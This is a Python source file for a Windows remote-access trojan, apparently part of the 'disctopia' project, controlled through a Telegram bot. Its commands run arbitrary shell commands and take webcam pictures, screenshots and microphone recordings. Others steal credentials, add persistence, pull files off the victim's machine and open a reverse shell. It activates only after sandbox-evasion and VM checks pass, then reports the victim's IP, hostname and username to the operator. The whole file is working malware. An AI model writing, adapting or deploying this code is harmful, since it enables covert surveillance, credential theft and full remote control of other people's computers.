import telebot
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
from libraries import credentials,sandboxevasion,disctopia

BOT_TOKEN = "{BOT_TOKEN}"
USER_ID = "{USER_ID}" 

bot = telebot.TeleBot(BOT_TOKEN)

def send_notification():
    now = datetime.now()
    message = f"{MSG} Time: {now.strftime('%d/%m/%Y %H:%M:%S')}\nIP: {disctopia.getIP()}\nBits: {disctopia.getBits()}\nHostname: {disctopia.getHostname()}\nOS: {disctopia.getOS()}\nUsername: {disctopia.getUsername()}\nCPU: {disctopia.getCPU()}\nAdmin: {disctopia.isAdmin()}\nVM: {disctopia.isVM()}"
    bot.send_message(USER_ID, message)

@bot.message_handler(commands=['cmd'])
def cmd(message):
    arguments = message.text.split()
    if len(arguments) > 1:
        command = ' '.join(arguments[1:])
        reply = disctopia.cmd(command)
        if len(reply) > 4000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(reply)
            bot.send_document(message.chat.id, open(path, 'rb'))
            os.remove(path)
        else:
            bot.reply_to(message, reply)
    else:        
        bot.reply_to(message, "Please specify all the required parameters: cmd <command>")

@bot.message_handler(commands=['cd'])
def cd(message):
    arguments = message.text.split()
    if len(arguments) > 1:
        path = ' '.join(arguments[1:])
        result = disctopia.cd(path)
        if result:
            reply = "Directory changed successfully"
        else:
            reply = "Directory not found"
        bot.reply_to(message, reply)
    else:
        bot.reply_to(message, "Please specify all the required parameters: cd <path>")

@bot.message_handler(commands=['webshot'])
def webshot(message):
    result = disctopia.webshot()
    if result != False:
        bot.send_document(message.chat.id, open(result, 'rb'))
        os.remove(result)
    else:
        bot.reply_to(message, "Error while trying to take a picture")

@bot.message_handler(commands=['process'])
def process(message):
    result = disctopia.process()
    if len(result) > 4000:
        path = os.environ["temp"] +"\\response.txt"     
        with open(path, 'w') as file:
            file.write(result)
        bot.send_document(message.chat.id, open(path, 'rb'))
        os.remove(path)
    else:
        bot.reply_to(message, result)

@bot.message_handler(commands=['upload'])
def upload(message):
    arguments = message.text.split()
    if len(arguments) > 2:
        url = arguments[1]
        name = ' '.join(arguments[2:])
        result = disctopia.upload(url, name)
        if result:
            reply = "File uploaded successfully"
        else:
            reply = f"Error while trying to upload the file:\n{result}"
        bot.reply_to(message, reply)
    else:
        bot.reply_to(message, "Please specify all the required parameters: upload <url> <name>")

@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    result = disctopia.screenshot()
    if result != False:
        bot.send_document(message.chat.id, open(result, 'rb'))
        os.remove(result)
    else:
        bot.reply_to(message, "Error while trying to take a screenshot")
    
@bot.message_handler(commands=['creds'])
def creds(message):
    result = disctopia.creds()
    if result != False:
        bot.send_document(message.chat.id, open(result, 'rb'))
        os.remove(result)
    else:
        bot.reply_to(message, "Error while trying to get credentials")

@bot.message_handler(commands=['persistent'])
def persistent(message):
    result = disctopia.persistent()
    if result:
        reply = "Persistence added successfully"
    else:
        reply = "Error while trying to add persistence"
    bot.reply_to(message, reply)

@bot.message_handler(commands=['ls'])
def ls(message):
    bot.reply_to(message, f"Agent#{ID} IP: {disctopia.getIP()}")

@bot.message_handler(commands=['download'])
def download(message):
    arguments = message.text.split()
    if len(arguments) > 1:
        path = ' '.join(arguments[1:])
        try:
            bot.send_document(message.chat.id, open(path, 'rb'))
        except Exception as e:
            bot.reply_to(message, "Error while trying to download the file:\n" + str(e))

    else:
        bot.reply_to(message, "Please specify all the required parameters: download <path>")

@bot.message_handler(commands=['terminate'])
def terminate(message):
    bot.reply_to(message, f"Agent#{ID} terminated")
    bot.stop_polling()
    sys.exit()

@bot.message_handler(commands=['selfdestruct'])
def selfdestruct(message):
    result = disctopia.selfdestruct()
    if result:
        bot.reply_to(message, "Agent destroyed successfully")
        bot.stop_polling()
        sys.exit()
    else:
        bot.reply_to(message, f"Error while trying to destroy the agent:\n{result}")

@bot.message_handler(commands=['location'])
def location(message):
    response = disctopia.location()
    if response != False:
        reply = f"""
        IP Based Location on Agent#{ID}
        IP: {response.json()['YourFuckingIPAddress']}
        Hostname: {response.json()['YourFuckingHostname']}
        City: {response.json()['YourFuckingLocation']}
        Country: {response.json()['YourFuckingCountryCode']}
        ISP: {response.json()['YourFuckingISP']}
        """
        bot.reply_to(message, reply)

    else:
        bot.reply_to(message, "Error while trying to get location")

@bot.message_handler(commands=['revshell'])
def revshell(message):
    arguments = message.text.split()
    if len(arguments) > 2:
        ip = arguments[1]
        port = ' '.join(arguments[2:])
        result = disctopia.revshell(ip, port)
        if result:
            bot.reply_to(message, "Attempting to establish a reverse shell")
    else:
        bot.reply_to(message, "Please specify all the required parameters: revshell <ip> <port>")

@bot.message_handler(commands=['recordmic'])
def recordmic(message):
    arguments = message.text.split()
    if len(arguments) > 1:
        interval = ' '.join(arguments[1:])
        result = disctopia.recordmic(interval)
        if result != False:
            bot.send_document(message.chat.id, open(result, 'rb'))
            os.remove(result)
        else:
            bot.reply_to(message, "Error while trying to record the microphone")
    else:
        bot.reply_to(message, "Please specify all the required parameters: recordmic <interval>")

@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    arguments = message.text.split()
    if len(arguments) > 1:
        url = ' '.join(arguments[1:])
        result = disctopia.wallpaper(url)
        if result:
            bot.reply_to(message, "Wallpaper changed successfully")
        else:
            bot.reply_to(message, f"Error while trying to change the wallpaper:\n{result}")
    else:
        bot.reply_to(message, "Please specify all the required parameters: wallpaper <url/path>")

@bot.message_handler(commands=['killproc'])
def killproc(message):
    arguments = message.text.split()
    if len(arguments) > 1:
        pid = ' '.join(arguments[1:])
        result = disctopia.killproc(pid)
        if result:
            bot.reply_to(message, "Process killed successfully")
        else:
            bot.reply_to(message, f"Error while trying to kill the process:\n{result}")
    else:
        bot.reply_to(message, "Please specify all the required parameters: killproc <pid>")


@bot.message_handler(commands=['help'])
def help(message):
    bot.reply_to(message, f"""
    Agent#{ID} Commands:
    cmd <command> - Execute a command
    cd <path> - Change directory
    webshot - Take a picture from the webcam
    process - List processes
    upload <url> <name> - Upload a file from a URL
    screenshot - Take a screenshot
    creds - Get credentials
    persistent - Add persistence
    ls - List agents
    download <path> - Download a file
    terminate - Terminate the agent
    selfdestruct - Destroy the agent
    location - Get location
    revshell <ip> <port> - Establish a reverse shell
    recordmic <interval> - Record the microphone
    wallpaper <url/path> - Change the wallpaper
    killproc <pid> - Kill a process
    help - Show this message
    """)

if sandboxevasion.test() == True and disctopia.isVM() == False:
    config = disctopia.createConfig()
    ID = disctopia.id()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent Online #{ID}"
        COLOR = 0x0000FF

    send_notification()

    bot.polling()